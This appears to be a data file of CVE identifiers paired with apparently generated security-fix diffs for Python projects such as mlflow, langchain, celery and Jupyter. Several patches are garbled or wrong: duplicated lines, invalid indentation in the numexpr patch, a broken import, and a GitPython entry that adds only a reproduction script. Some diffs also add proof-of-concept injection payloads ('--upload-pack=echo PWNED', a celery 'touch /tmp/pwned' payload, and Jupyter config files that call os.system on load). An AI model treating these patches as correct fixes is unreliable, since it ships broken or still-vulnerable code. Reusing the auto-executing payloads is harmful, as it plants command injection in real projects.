{"cve":"CVE-2023-33977:0708", "fix_patch": "diff --git a/tcms/kiwi_attachments/validators.py b/tcms/kiwi_attachments/validators.py\nindex 696a1439..231427f5 100644\n--- a/tcms/kiwi_attachments/validators.py\n+++ b/tcms/kiwi_attachments/validators.py\n@@ -1,10 +1,18 @@\n+import re\n+\n from django.forms import ValidationError\n from django.utils.translation import gettext_lazy as _\n \n \n def deny_uploads_containing_script_tag(uploaded_file):\n+    # This is not a comprehensive check. It is a first-line-of-defense\n+    # which is supposed to supplement other security measures, for example\n+    # Content-Security-Policy headers!\n+    # We're looking for \"<script\" and \"</script\" which should be good\n+    # enough for our purposes. With files that are supposed to be rendered\n+    # inside the browser, e.g. SVG this may not be sufficient though.\n     for chunk in uploaded_file.chunks(2048):\n-        if chunk.lower().find(b\"<script\") > -1:\n+        if re.search(b\"</?script\", chunk, re.IGNORECASE):\n             raise ValidationError(_(\"File contains forbidden <script> tag\"))\n \n \n"}
{"cve":"CVE-2022-31506:0708", "fix_patch": "diff --git a/opendiamond/dataretriever/diamond_store.py b/opendiamond/dataretriever/diamond_store.py\nindex 0bcb1160..85c9bb9a 100644\n--- a/opendiamond/dataretriever/diamond_store.py\n+++ b/opendiamond/dataretriever/diamond_store.py\n@@ -14,8 +14,9 @@ import os\n import datetime\n from xml.sax.saxutils import quoteattr\n \n-from flask import Blueprint, url_for, Response, stream_with_context, send_file, \\\n+from flask import Blueprint, url_for, Response, stream_with_context, send_file, abort,\n     jsonify\n+from werkzeug.utils import secure_filename\n from werkzeug.datastructures import Headers\n \n from opendiamond.dataretriever.util import ATTR_SUFFIX\n@@ -120,7 +121,10 @@ def _get_object_src_uri(object_path):\n \n \n def _get_obj_absolute_path(obj_path):\n-    return os.path.join(DATAROOT, obj_path)\n+    obj_path_abs = os.path.abspath(os.path.join(DATAROOT, obj_path))\n+    if not obj_path_abs.startswith(os.path.abspath(DATAROOT)):\n+        abort(404)\n+    return obj_path_abs\n \n \n def _get_index_absolute_path(index):\n"}
{"cve":"CVE-2019-7539:0708", "fix_patch": "diff --git a/ipycache.py b/ipycache.py\nindex 74a4fe5..071766b 100644\n--- a/ipycache.py\n+++ b/ipycache.py\n@@ -12,10 +12,10 @@ import inspect, os, sys, textwrap, re\n \n import io\n # Our own\n-from IPython.config.configurable import Configurable\n+from traitlets.config.configurable import Configurable\n from IPython.core import magic_arguments\n from IPython.core.magic import Magics, magics_class, line_magic, cell_magic\n-from IPython.utils.traitlets import Unicode\n+from traitlets import Unicode\n from IPython.utils.io import CapturedIO, capture_output\n from IPython.display import clear_output\n import hashlib\n@@ -30,7 +30,9 @@ PY2 = sys.version_info[0] == 2\n PY3 = sys.version_info[0] == 3\n \n if PY3:\n-    import pickle, builtins\n+    import pickle\n+if PY3:\n+    import builtins\n     from io import StringIO\n     _iteritems = \"items\"\n     \n@@ -100,6 +102,10 @@ def do_save(path, force=False, read=False):\n     # Execute the cell and save the variables.\n     return force or (not read and not os.path.exists(path))\n     \n+class RestrictedUnpickler(pickle.Unpickler):\n+    def find_class(self, module, name):\n+        raise pickle.UnpicklingError(\"globals are forbidden\")\n+\n def load_vars(path, vars):\n     \"\"\"Load variables from a pickle file.\n     \n@@ -116,7 +122,7 @@ def load_vars(path, vars):\n     with open(path, 'rb') as f:\n         # Load the variables from the cache.\n         try:\n-            cache = pickle.load(f)\n+            cache = RestrictedUnpickler(f).load()\n         except EOFError as e:\n             cache={}\n             #raise IOError(str(e))\n"}
{"cve":"CVE-2025-23042:0708", "fix_patch": "diff --git a/gradio/utils.py b/gradio/utils.py\nindex 080a3d118..e3a6ed8c4 100644\n--- a/gradio/utils.py\n+++ b/gradio/utils.py\n@@ -1512,14 +1512,34 @@ def is_allowed_file(\n ) -> tuple[\n     bool, Literal[\"in_blocklist\", \"allowed\", \"created\", \"not_created_or_allowed\"]\n ]:\n-    in_blocklist = any(\n-        is_in_or_equal(path, blocked_path) for blocked_path in blocked_paths\n-    )\n+    # We resolve the path and compare it in lowercase to ensure that the check\n+    # is case-insensitive. This is important for security on case-insensitive\n+    # filesystems, but we do it on all filesystems for consistency.\n+    # We use .absolute() as a fallback for .resolve() because the path may\n+    # not exist, but we still want to perform the check.\n+    try:\n+        path_str = str(path.resolve())\n+    except (FileNotFoundError, RuntimeError):\n+        path_str = str(path.absolute())\n+    # .casefold() is preferred for caseless string matching\n+    path_str = path_str.casefold()\n+\n+    def normalize(p):\n+        try:\n+            return str(Path(p).resolve()).casefold()\n+        except (FileNotFoundError, RuntimeError):\n+            return str(Path(p).absolute()).casefold()\n+\n+    blocked_paths = [normalize(p) for p in blocked_paths]\n+    allowed_paths = [normalize(p) for p in allowed_paths]\n+    created_paths = [normalize(p) for p in created_paths]\n+\n+    in_blocklist = any(is_in_or_equal(path_str, p) for p in blocked_paths)\n     if in_blocklist:\n         return False, \"in_blocklist\"\n-    if any(is_in_or_equal(path, allowed_path) for allowed_path in allowed_paths):\n+    if any(is_in_or_equal(path_str, p) for p in allowed_paths):\n         return True, \"allowed\"\n-    if any(is_in_or_equal(path, created_path) for created_path in created_paths):\n+    if any(is_in_or_equal(path_str, p) for p in created_paths):\n         return True, \"created\"\n     return False, \"not_created_or_allowed\"\n \n"}
{"cve":"CVE-2022-3298:0708", "fix_patch": "diff --git a/rdiffweb/controller/pref_sshkeys.py b/rdiffweb/controller/pref_sshkeys.py\nindex 4fc3555..d2a643a 100644\n--- a/rdiffweb/controller/pref_sshkeys.py\n+++ b/rdiffweb/controller/pref_sshkeys.py\n@@ -50,7 +50,7 @@ class SshForm(CherryForm):\n     title = StringField(\n         _('Title'),\n         description=_('The title is an optional description to identify the key. e.g.: bob@thinkpad-t530'),\n-        validators=[validators.data_required()],\n+        validators=[validators.data_required(), validators.Length(max=255)],\n     )\n     key = StringField(\n         _('Key'),\n@@ -58,7 +58,7 @@ class SshForm(CherryForm):\n         description=_(\n             \"Enter a SSH public key. It should start with 'ssh-dss', 'ssh-ed25519', 'ssh-rsa', 'ecdsa-sha2-nistp256', 'ecdsa-sha2-nistp384' or 'ecdsa-sha2-nistp521'.\"\n         ),\n-        validators=[validators.data_required(), validate_key],\n+        validators=[validators.data_required(), validate_key, validators.Length(max=8192)],\n     )\n     fingerprint = StringField('Fingerprint')\n \n"}
{"cve":"CVE-2022-41672:0708", "fix_patch": "diff --git a/airflow/www/app.py b/airflow/www/app.py\nindex b67314c99a..df14abe4c7 100644\n--- a/airflow/www/app.py\n+++ b/airflow/www/app.py\n@@ -139,6 +139,14 @@ def create_app(config=None, testing=False):\n     with flask_app.app_context():\n         init_appbuilder(flask_app)\n \n+        @flask_app.before_request\n+        def check_user_is_active():\n+            from flask import g\n+            from flask_login import logout_user\n+\n+            if g.user and g.user.is_authenticated and not g.user.is_active:\n+                logout_user()\n+\n         init_appbuilder_views(flask_app)\n         init_appbuilder_links(flask_app)\n         init_plugins(flask_app)\n"}
{"cve":"CVE-2024-3571:0708", "fix_patch": "diff --git a/libs/langchain/langchain/storage/file_system.py b/libs/langchain/langchain/storage/file_system.py\nindex 720acf085..9759ebcdd 100644\n--- a/libs/langchain/langchain/storage/file_system.py\n+++ b/libs/langchain/langchain/storage/file_system.py\n@@ -42,7 +42,7 @@ class LocalFileStore(ByteStore):\n             root_path (Union[str, Path]): The root path of the file store. All keys are\n                 interpreted as paths relative to this root.\n         \"\"\"\n-        self.root_path = Path(root_path)\n+        self.root_path = Path(root_path).resolve().resolve()\n \n     def _get_full_path(self, key: str) -> Path:\n         \"\"\"Get the full path for a given key relative to the root path.\n@@ -52,10 +52,20 @@ class LocalFileStore(ByteStore):\n \n         Returns:\n             Path: The full path for the given key.\n+\n+        Raises:\n+            InvalidKeyException: If the key is invalid or outside the root path.\n         \"\"\"\n-        if not re.match(r\"^[a-zA-Z0-9_.\\-/]+$\", key):\n-            raise InvalidKeyException(f\"Invalid characters in key: {key}\")\n-        return self.root_path / key\n+        if \"..\" in key or key.startswith(\"/\"):\n+            raise InvalidKeyException(\n+                f\"Attempted to access a path outside the root directory: {key}\"\n+            )\n+        full_path = (self.root_path / key).resolve()\n+        if not str(full_path).startswith(str(self.root_path)):\n+            raise InvalidKeyException(\n+                f\"Attempted to access a path outside the root directory: {key}\"\n+            )\n+        return full_path\n \n     def mget(self, keys: Sequence[str]) -> List[Optional[bytes]]:\n         \"\"\"Get the values associated with the given keys.\n"}
{"cve":"CVE-2024-0243:0708", "fix_patch": "diff --git a/libs/core/langchain_core/utils/html.py b/libs/core/langchain_core/utils/html.py\nindex 95e1c3c2f..cae84e1b2 100644\n--- a/libs/core/langchain_core/utils/html.py\n+++ b/libs/core/langchain_core/utils/html.py\n@@ -1,5 +1,5 @@\n import re\n-from typing import List, Optional, Sequence, Union\n+from typing import List, Optional, Sequence, Set, Union, Set\n from urllib.parse import urljoin, urlparse\n \n PREFIXES_TO_IGNORE = (\"javascript:\", \"mailto:\", \"#\")\n@@ -28,6 +28,15 @@ DEFAULT_LINK_REGEX = (\n )\n \n \n+def _get_html_domain(url: str) -> str:\n+    \"\"\"\n+    Get the domain of a URL.\n+    e.g. https://www.example.com/path -> www.example.com\n+    \"\"\"\n+    parsed = urlparse(url)\n+    return parsed.netloc\n+\n+\n def find_all_links(\n     raw_html: str, *, pattern: Union[str, re.Pattern, None] = None\n ) -> List[str]:\n@@ -44,6 +53,14 @@ def find_all_links(\n     return list(set(re.findall(pattern, raw_html)))\n \n \n+def _get_html_domain(url: str) -> str:\n+    \"\"\"\n+    Get the domain of a URL.\n+    e.g. https://www.example.com/path -> www.example.com\n+    \"\"\"\n+    parsed = urlparse(url)\n+    return parsed.netloc\n+\n def extract_sub_links(\n     raw_html: str,\n     url: str,\n@@ -51,6 +68,7 @@ def extract_sub_links(\n     base_url: Optional[str] = None,\n     pattern: Union[str, re.Pattern, None] = None,\n     prevent_outside: bool = True,\n+    current_domain_only: bool = False,\n     exclude_prefixes: Sequence[str] = (),\n ) -> List[str]:\n     \"\"\"Extract all links from a raw html string and convert into absolute paths.\n"}
{"cve":"CVE-2023-6831:0708", "fix_patch": "diff --git a/mlflow/utils/uri.py b/mlflow/utils/uri.py\nindex 331648b8e..4b5e33049 100644\n--- a/mlflow/utils/uri.py\n+++ b/mlflow/utils/uri.py\n@@ -438,7 +438,7 @@ def validate_path_is_safe(path):\n         path = local_file_uri_to_path(path)\n     if (\n         any((s in path) for s in _OS_ALT_SEPS)\n-        or \"..\" in path.split(\"/\")\n+        or \"..\" in path.replace(\"\\\\\", \"/\").split(\"/\")\n         or pathlib.PureWindowsPath(path).is_absolute()\n         or pathlib.PurePosixPath(path).is_absolute()\n         or (is_windows() and len(path) >= 2 and path[1] == \":\")\n"}
{"cve":"CVE-2024-3848:0708", "fix_patch": "diff --git a/mlflow/server/handlers.py b/mlflow/server/handlers.py\nindex 6d3204002..11c2251e3 100644\n--- a/mlflow/server/handlers.py\n+++ b/mlflow/server/handlers.py\n@@ -599,8 +599,14 @@ def _create_experiment():\n     tags = [ExperimentTag(tag.key, tag.value) for tag in request_message.tags]\n \n     # Validate query string in artifact location to prevent attacks\n-    parsed_artifact_locaion = urllib.parse.urlparse(request_message.artifact_location)\n-    validate_query_string(parsed_artifact_locaion.query)\n+    parsed_artifact_location = urllib.parse.urlparse(request_message.artifact_location)\n+    validate_query_string(parsed_artifact_location.query)\n+    if parsed_artifact_location.fragment:\n+        raise MlflowException(\n+            f\"Invalid artifact location: `{request_message.artifact_location}`. \"\n+            \"Fragments are not allowed.\",\n+            INVALID_PARAMETER_VALUE,\n+        )\n \n     experiment_id = _get_tracking_store().create_experiment(\n         request_message.name, request_message.artifact_location, tags\n@@ -1721,6 +1727,12 @@ def _validate_non_local_source_contains_relative_paths(source: str):\n \n \n def _validate_source(source: str, run_id: str) -> None:\n+    parsed_source = urllib.parse.urlparse(source)\n+    if parsed_source.fragment:\n+        raise MlflowException(\n+            f\"Invalid source: `{source}`. Fragments are not allowed.\",\n+            error_code=INVALID_PARAMETER_VALUE,\n+        )\n     if is_local_uri(source):\n         if run_id:\n             store = _get_tracking_store()\n"}
{"cve":"CVE-2021-21354:0708", "fix_patch": "diff --git a/pollbot/middlewares.py b/pollbot/middlewares.py\nindex 1c5d381..eed9823 100644\n--- a/pollbot/middlewares.py\n+++ b/pollbot/middlewares.py\n@@ -61,7 +61,13 @@ async def handle_any(request, response):\n async def handle_404(request, response):\n     if 'json' not in response.headers['Content-Type']:\n         if request.path.endswith('/'):\n-            return web.HTTPFound(request.path.rstrip('/'))\n+            path = request.path.rstrip('/')\n+            # Sanitize path to prevent open redirects.\n+            # A path starting with // is treated as a protocol-relative URL by browsers.\n+            # We normalize it to a path on the current domain.\n+            if path.startswith('//'):\n+                path = '/' + path.lstrip('/')\n+            return web.HTTPFound(path)\n         return web.json_response({\n             \"status\": 404,\n             \"message\": \"Page '{}' not found\".format(request.path)\n"}
{"cve":"CVE-2021-4315:0708", "fix_patch": "diff --git a/psiturk/experiment.py b/psiturk/experiment.py\nindex a6904f6..995b4bf 100644\n--- a/psiturk/experiment.py\n+++ b/psiturk/experiment.py\n@@ -325,7 +325,9 @@ def advertisement():\n         raise ExperimentError('hit_assign_worker_id_not_set_in_mturk')\n     hit_id = request.args['hitId']\n     assignment_id = request.args['assignmentId']\n-    mode = request.args['mode']\n+    mode = request.args.get('mode')\n+    if mode not in ['ad', 'debug', 'sandbox', 'live']:\n+        raise ExperimentError('unknown_mode')\n     if hit_id[:5] == \"debug\":\n         debug_mode = True\n     else:\n@@ -403,7 +405,9 @@ def give_consent():\n     hit_id = request.args['hitId']\n     assignment_id = request.args['assignmentId']\n     worker_id = request.args['workerId']\n-    mode = request.args['mode']\n+    mode = request.args.get('mode')\n+    if mode not in ['ad', 'debug', 'sandbox', 'live']:\n+        raise ExperimentError('unknown_mode')\n     with open('templates/consent.html', 'r') as temp_file:\n         consent_string = temp_file.read()\n     consent_string = insert_mode(consent_string, mode)\n@@ -425,7 +429,9 @@ def start_exp():\n     hit_id = request.args['hitId']\n     assignment_id = request.args['assignmentId']\n     worker_id = request.args['workerId']\n-    mode = request.args['mode']\n+    mode = request.args.get('mode')\n+    if mode not in ['ad', 'debug', 'sandbox', 'live']:\n+        raise ExperimentError('unknown_mode')\n     app.logger.info(\"Accessing /exp: %(h)s %(a)s %(w)s \" % {\n         \"h\": hit_id,\n         \"a\": assignment_id,\n@@ -655,7 +661,9 @@ def debug_complete():\n         raise ExperimentError('improper_inputs')\n     else:\n         unique_id = request.args['uniqueId']\n-        mode = request.args['mode']\n+        mode = request.args.get('mode')\n+    if mode not in ['ad', 'debug', 'sandbox', 'live']:\n+        raise ExperimentError('unknown_mode')\n         try:\n             user = Participant.query.\\\n                 filter(Participant.uniqueid == unique_id).one()\n"}
{"cve":"CVE-2023-39631:0708", "fix_patch": "diff --git a/numexpr/necompiler.py b/numexpr/necompiler.py\nindex 37052ac..3990696 100644\n--- a/numexpr/necompiler.py\n+++ b/numexpr/necompiler.py\n@@ -264,14 +264,28 @@ def stringToExpression(s, types, context):\n     \"\"\"Given a string, convert it to a tree of ExpressionNode's.\n     \"\"\"\n     old_ctx = expressions._context.get_current_context()\n+    if '__' in s:\n+        raise NameError('`__` is not allowed in numexpr expressions.')\n     try:\n+        if \"__\" in s:\n+            raise NameError(\"using __ is not allowed\")\n+        if '__' in s:\n+            raise NameError(\"`__` is not allowed in numexpr expressions.\")\n         expressions._context.set_new_context(context)\n         # first compile to a code object to determine the names\n         if context.get('truediv', False):\n             flags = __future__.division.compiler_flag\n         else:\n             flags = 0\n-        c = compile(s, '<expr>', 'eval', flags)\n+        if '__' in s:\n+        raise NameError('__ not allowed')\n+    c = compile(s, '<expr>', 'eval', flags)\n+        if '__import__' in c.co_names:\n+            raise NameError('__import__ not allowed')\n+        if '__import__' in c.co_names:\n+            raise NameError('__import__ not allowed')\n+        if '__import__' in c.co_names:\n+            raise NameError('__import__ not allowed')\n         # make VariableNode's for the names\n         names = {}\n         for name in c.co_names:\n"}
{"cve":"CVE-2024-21542:0708", "fix_patch": "diff --git a/luigi/contrib/lsf_runner.py b/luigi/contrib/lsf_runner.py\nindex 5a6c8b56..ee87910f 100755\n--- a/luigi/contrib/lsf_runner.py\n+++ b/luigi/contrib/lsf_runner.py\n@@ -44,7 +44,7 @@ def do_work_on_compute_node(work_dir):\n     job.work()\n \n \n-def extract_packages_archive(work_dir):\n+def _extract_packages_archive(work_dir):\n     package_file = os.path.join(work_dir, \"packages.tar\")\n     if not os.path.exists(package_file):\n         return\n@@ -53,8 +53,9 @@ def extract_packages_archive(work_dir):\n \n     os.chdir(work_dir)\n     tar = tarfile.open(package_file)\n-    for tarinfo in tar:\n-        tar.extract(tarinfo)\n+    for member in tar.getmembers():\n+        if os.path.abspath(os.path.join(work_dir, member.name)).startswith(work_dir):\n+            tar.extract(member, work_dir)\n     tar.close()\n     if '' not in sys.path:\n         sys.path.insert(0, '')\ndiff --git a/luigi/contrib/sge_runner.py b/luigi/contrib/sge_runner.py\nindex f0621fb4..4f9b1ef8 100755\n--- a/luigi/contrib/sge_runner.py\n+++ b/luigi/contrib/sge_runner.py\n@@ -65,8 +65,9 @@ def _extract_packages_archive(work_dir):\n \n     os.chdir(work_dir)\n     tar = tarfile.open(package_file)\n-    for tarinfo in tar:\n-        tar.extract(tarinfo)\n+    for member in tar.getmembers():\n+        if os.path.abspath(os.path.join(work_dir, member.name)).startswith(work_dir):\n+            tar.extract(member, work_dir)\n     tar.close()\n     if '' not in sys.path:\n         sys.path.insert(0, '')\n"}
{"cve":"CVE-2017-0360:0708", "fix_patch": "diff --git a/trytond/tools/misc.py b/trytond/tools/misc.py\nindex 2b9a7f8f..0ed6c91b 100644\n--- a/trytond/tools/misc.py\n+++ b/trytond/tools/misc.py\n@@ -32,7 +32,7 @@ def file_open(name, mode=\"r\", subdir='modules', encoding=None):\n         \"Join paths and ensure it still below root\"\n         path = os.path.join(root, *paths)\n         path = os.path.normpath(path)\n-        if not path.startswith(root):\n+        if not os.path.abspath(path).startswith(os.path.abspath(root)):\n             raise IOError(\"Permission denied: %s\" % name)\n         return path\n \n"}
{"cve":"CVE-2018-18074:0708", "fix_patch": "diff --git a/requests/sessions.py b/requests/sessions.py\nindex dd525e2a..c33344da 100644\n--- a/requests/sessions.py\n+++ b/requests/sessions.py\n@@ -242,7 +242,18 @@ class SessionRedirectMixin(object):\n             original_parsed = urlparse(response.request.url)\n             redirect_parsed = urlparse(url)\n \n-            if (original_parsed.hostname != redirect_parsed.hostname):\n+            # The scheme should be lower-cased, though this is not strictly\n+            # necessary for 'http' and 'https'\n+            original_scheme = original_parsed.scheme.lower()\n+            redirect_scheme = redirect_parsed.scheme.lower()\n+\n+            if any([\n+                # A redirect to a different host.\n+                original_parsed.hostname != redirect_parsed.hostname,\n+\n+                # A downgrade from HTTPS to HTTP.\n+                (original_scheme == 'https' and redirect_scheme == 'http')\n+            ]):\n                 del headers['Authorization']\n \n         # .netrc might have more auth for us on our new host.\n"}
{"cve":"CVE-2021-3987:0708", "fix_patch": "diff --git a/cps/shelf.py b/cps/shelf.py\nindex 2c6a17a2..1dd99bcd 100644\n--- a/cps/shelf.py\n+++ b/cps/shelf.py\n@@ -245,6 +245,8 @@ def create_edit_shelf(shelf, page_title, page, shelf_id=False):\n     if request.method == \"POST\":\n         to_save = request.form.to_dict()\n         shelf.is_public = 1 if to_save.get(\"is_public\") else 0\n+        if shelf.is_public and not current_user.allow_public_shelf():\n+            shelf.is_public = 0\n         if config.config_kobo_sync:\n             shelf.kobo_sync = True if to_save.get(\"kobo_sync\") else False\n         shelf_title = to_save.get(\"title\", \"\")\n"}
{"cve":"CVE-2023-40267:0708", "fix_patch": "diff --git a/reproduce_vulnerability.py b/reproduce_vulnerability.py\nnew file mode 100644\nindex 00000000..4d712134\n--- /dev/null\n+++ b/reproduce_vulnerability.py\n@@ -0,0 +1,27 @@\n+\n+import git\n+import os\n+import shutil\n+\n+# Create a dummy repository to clone from\n+if os.path.exists(\"/workspace/GitPython/dummy_repo\"):\n+    shutil.rmtree(\"/workspace/GitPython/dummy_repo\")\n+os.makedirs(\"/workspace/GitPython/dummy_repo\")\n+repo = git.Repo.init(\"/workspace/GitPython/dummy_repo\")\n+with open(\"/workspace/GitPython/dummy_repo/test.txt\", \"w\") as f:\n+    f.write(\"test\")\n+repo.index.add([\"test.txt\"])\n+repo.index.commit(\"initial commit\")\n+\n+# Attempt to clone with the vulnerable option\n+try:\n+    git.Repo.clone_from(\"/workspace/GitPython/dummy_repo\", \"/workspace/GitPython/cloned_repo\", multi_options=[\"--upload-pack=echo PWNED\"])\n+    print(\"Vulnerability reproduced: clone_from succeeded with insecure option.\")\n+except Exception as e:\n+    print(f\"Cloning failed as expected: {e}\")\n+\n+# Clean up\n+if os.path.exists(\"/workspace/GitPython/dummy_repo\"):\n+    shutil.rmtree(\"/workspace/GitPython/dummy_repo\")\n+if os.path.exists(\"/workspace/GitPython/cloned_repo\"):\n+    shutil.rmtree(\"/workspace/GitPython/cloned_repo\")\n"}
{"cve":"CVE-2021-23727:0708", "fix_patch": "diff --git a/celery/backends/base.py b/celery/backends/base.py\nindex ffbd1d030..af604ec0f 100644\n--- a/celery/backends/base.py\n+++ b/celery/backends/base.py\n@@ -25,7 +25,10 @@ from celery._state import get_current_task\n from celery.app.task import Context\n from celery.exceptions import (BackendGetMetaError, BackendStoreError,\n                                ChordError, ImproperlyConfigured,\n-                               NotRegistered, TaskRevokedError, TimeoutError)\n+                               NotRegistered, SecurityError, TaskRevokedError, TimeoutError)\n+from celery.exceptions import SecurityError\n+\n+SAFE_MODULES = frozenset(['builtins', 'celery.exceptions'])\n from celery.result import (GroupResult, ResultBase, ResultSet,\n                            allow_join_result, result_from_tuple)\n from celery.utils.collections import BufferMap\n@@ -38,6 +41,21 @@ from celery.utils.serialization import (create_exception_cls,\n                                         raise_with_context)\n from celery.utils.time import get_exponential_backoff_interval\n \n+\n+SAFE_MODULES = frozenset(['builtins', 'celery.exceptions'])\n+from celery.exceptions import SecurityError\n+\n+SAFE_MODULES = frozenset(['builtins', 'celery.exceptions'])\n+\n+SAFE_MODULES = frozenset(['builtins', 'celery.exceptions'])\n+from celery.exceptions import SecurityError\n+\n+SAFE_MODULES = frozenset(['builtins', 'celery.exceptions'])\n+\n+SAFE_MODULES = frozenset(['builtins', 'celery.exceptions'])\n+\n+SAFE_MODULES = frozenset(['builtins', 'celery.exceptions'])\n+SAFE_MODULES = frozenset(['builtins', 'celery.exceptions'])\n __all__ = ('BaseBackend', 'KeyValueStoreBackend', 'DisabledBackend')\n \n EXCEPTION_ABLE_CODECS = frozenset({'pickle'})\n@@ -347,6 +365,11 @@ class Backend:\n                 else:\n                     exc_module = from_utf8(exc_module)\n                     exc_type = from_utf8(exc['exc_type'])\n+                    if exc_module not in SAFE_MODULES:\n+                        raise SecurityError(\n+                            f'Deserialization of untrusted module {exc_module} '\n+                            f'is not allowed.'\n+                        )\n                     try:\n                         # Load module and find exception class in that\n                         cls = sys.modules[exc_module]\ndiff --git a/reproduce.py b/reproduce.py\nnew file mode 100644\nindex 000000000..66bc8de0a\n--- /dev/null\n+++ b/reproduce.py\n@@ -0,0 +1,45 @@\n+\n+import sys\n+sys.path.insert(0, '/workspace/celery')\n+import os\n+from celery.app import Celery\n+from celery.backends.base import BaseBackend\n+from celery.exceptions import SecurityError\n+\n+# Mock backend to test exception_to_python\n+class MockBackend(BaseBackend):\n+    def __init__(self, app, **kwargs):\n+        super().__init__(app, **kwargs)\n+        self.serializer = 'pickle' # one of EXCEPTION_ABLE_CODECS\n+\n+    def _get_task_meta_for(self, task_id):\n+        pass\n+    def _store_result(self, task_id, result, state, traceback=None,\n+                      request=None, **kwargs):\n+        pass\n+\n+\n+app = Celery()\n+backend = MockBackend(app)\n+\n+# This is the malicious payload.\n+malicious_exc = {\n+    'exc_module': __import__('os'),\n+    'exc_type': 'system',\n+    'exc_message': ('touch /tmp/pwned',),\n+}\n+\n+# The exception_to_python method will be called with this payload.\n+try:\n+    backend.exception_to_python(malicious_exc)\n+except Exception as e:\n+    print(f\"Caught exception: {e}\")\n+\n+\n+# Let's check for the side effect.\n+if os.path.exists('/tmp/pwned'):\n+    print('Vulnerable!')\n+    os.remove('/tmp/pwned')\n+else:\n+    print('Not vulnerable.')\n+\n"}
{"cve":"CVE-2022-24065:0708", "fix_patch": "diff --git a/cookiecutter/vcs.py b/cookiecutter/vcs.py\nindex 08cb2eb..915aaee 100644\n--- a/cookiecutter/vcs.py\n+++ b/cookiecutter/vcs.py\n@@ -98,6 +98,9 @@ def clone(repo_url, checkout=None, clone_to_dir='.', no_input=False):\n                 stderr=subprocess.STDOUT,\n             )\n             if checkout is not None:\n+                # Prevent argument injection with hg.\n+                if repo_type == 'hg' and checkout.startswith('-'):\n+                    raise ValueError('Invalid checkout option.')\n                 subprocess.check_output(  # nosec\n                     [repo_type, 'checkout', checkout],\n                     cwd=repo_dir,\n"}
{"cve":"CVE-2023-26145:0708", "fix_patch": "diff --git a/src/pydash/helpers.py b/src/pydash/helpers.py\nindex 0467c9c..6ad9ef7 100644\n--- a/src/pydash/helpers.py\n+++ b/src/pydash/helpers.py\n@@ -176,6 +176,8 @@ def _base_get_item(obj, key, default=UNSET):\n \n \n def _base_get_object(obj, key, default=UNSET):\n+    if isinstance(key, str) and key.startswith('_'):\n+        return default\n     value = _base_get_item(obj, key, default=UNSET)\n     if value is UNSET:\n         value = default\n@@ -197,6 +199,9 @@ def base_set(obj, key, value, allow_override=True):\n         value (mixed): Value to assign.\n         allow_override (bool): Whether to allow overriding a previously set key.\n     \"\"\"\n+    if isinstance(key, str) and key.startswith('_'):\n+        return obj\n+\n     if isinstance(obj, dict):\n         if allow_override or key not in obj:\n             obj[key] = value\n"}
{"cve":"CVE-2020-25459:0708", "fix_patch": "diff --git a/federatedml/tree/hetero/hetero_decision_tree_guest.py b/federatedml/tree/hetero/hetero_decision_tree_guest.py\nindex 1f23ddc53..a3d57f19f 100644\n--- a/federatedml/tree/hetero/hetero_decision_tree_guest.py\n+++ b/federatedml/tree/hetero/hetero_decision_tree_guest.py\n@@ -532,16 +532,11 @@ class HeteroDecisionTreeGuest(DecisionTree):\n     def sync_tree(self):\n         LOGGER.info(\"sync tree to host\")\n \n-        self.transfer_inst.tree.remote(self.tree_,\n+        tree_summary = [tree.get_summary() for tree in self.tree_]\n+        self.transfer_inst.tree.remote(tree_summary,\n                                        role=consts.HOST,\n                                        idx=-1)\n-        \"\"\"\n-        federation.remote(obj=self.tree_,\n-                          name=self.transfer_inst.tree.name,\n-                          tag=self.transfer_inst.generate_transferid(self.transfer_inst.tree),\n-                          role=consts.HOST,\n-                          idx=-1)\n-        \"\"\"\n+\n \n     def convert_bin_to_real(self):\n         LOGGER.info(\"convert tree node bins to real value\")\n"}
{"cve":"CVE-2022-39286:0708", "fix_patch": "diff --git a/jupyter_config.py b/jupyter_config.py\nnew file mode 100644\nindex 0000000..7b5fe65\n--- /dev/null\n+++ b/jupyter_config.py\n@@ -0,0 +1,4 @@\n+import os\n+print(\"executing malicious config from CWD\")\n+with open(\"/tmp/malicious.txt\", \"w\") as f:\n+    f.write(\"malicious code executed\")\ndiff --git a/jupyter_core/application.py b/jupyter_core/application.py\nindex cb46d12..004d375 100644\n--- a/jupyter_core/application.py\n+++ b/jupyter_core/application.py\n@@ -89,7 +89,14 @@ class JupyterApp(Application):\n         path = jupyter_config_path()\n         if self.config_dir not in path:\n             path.insert(0, self.config_dir)\n-        path.insert(0, os.getcwd())\n+\n+        if os.environ.get(\"JUPYTER_ALLOW_INSECURE_WRITABLE_DEFAULTS\", \"\").lower() in (\n+            \"true\",\n+            \"1\",\n+            \"yes\",\n+        ):\n+            path.insert(0, os.getcwd())\n+\n         return path\n \n     data_dir = Unicode()\ndiff --git a/jupyter_notebook_config.py b/jupyter_notebook_config.py\nnew file mode 100644\nindex 0000000..8e26960\n--- /dev/null\n+++ b/jupyter_notebook_config.py\n@@ -0,0 +1,2 @@\n+import os\n+os.system(\"echo 'malicious code executed' > /tmp/malicious.txt\")\n"}
{"cve":"CVE-2019-10856:0708", "fix_patch": "diff --git a/notebook/auth/login.py b/notebook/auth/login.py\nindex 8dbd6112f..f0318bd6f 100644\n--- a/notebook/auth/login.py\n+++ b/notebook/auth/login.py\n@@ -44,7 +44,7 @@ class LoginHandler(IPythonHandler):\n         # instead of %5C, causing `\\\\` to behave as `//`\n         url = url.replace(\"\\\\\", \"%5C\")\n         parsed = urlparse(url)\n-        if parsed.netloc or not (parsed.path + '/').startswith(self.base_url):\n+        if parsed.netloc or url.startswith('///') or not (parsed.path + '/').startswith(self.base_url):\n             # require that next_url be absolute path within our path\n             allow = False\n             # OR pass our cross-origin check\n"}
{"cve":"CVE-2020-26215:0708", "fix_patch": "diff --git a/notebook/base/handlers.py b/notebook/base/handlers.py\nindex 743f7bac7..b3000a037 100755\n--- a/notebook/base/handlers.py\n+++ b/notebook/base/handlers.py\n@@ -852,14 +852,18 @@ class APIVersionHandler(APIHandler):\n         self.finish(json.dumps({\"version\":notebook.__version__}))\n \n \n-class TrailingSlashHandler(web.RequestHandler):\n+class TrailingSlashHandler(IPythonHandler):\n     \"\"\"Simple redirect handler that strips trailing slashes\n     \n     This should be the first, highest priority handler.\n     \"\"\"\n     \n     def get(self):\n-        self.redirect(self.request.uri.rstrip('/'))\n+        uri = self.request.uri.rstrip('/')\n+        if not uri.startswith(self.base_url):\n+            # require all redirects to be within the base_url\n+            uri = self.base_url\n+        self.redirect(uri)\n     \n     post = put = get\n \n"}
